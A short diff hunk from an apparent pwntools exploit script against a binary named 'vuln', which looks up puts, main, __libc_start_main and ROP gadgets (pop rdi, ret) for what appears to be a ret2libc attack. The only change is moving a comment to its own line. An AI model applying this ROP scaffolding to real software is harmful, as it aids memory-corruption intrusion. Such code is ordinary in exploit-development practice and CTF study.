@@ -28,7 +28,9 @@ libc = ELF("libc-2.27.so")
 PUTS = elf.plt['puts']
 MAIN = elf.symbols['main']
 LIBC_START_MAIN = elf.symbols['__libc_start_main']
-POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] # Same as ROPgadget --binary vuln | grep "pop rdi"
+
+# Same as ROPgadget --binary vuln | grep "pop rdi"
+POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]
 RET = (rop.find_gadget(['ret']))[0]
 
 log.info("puts@plt: " + hex(PUTS))
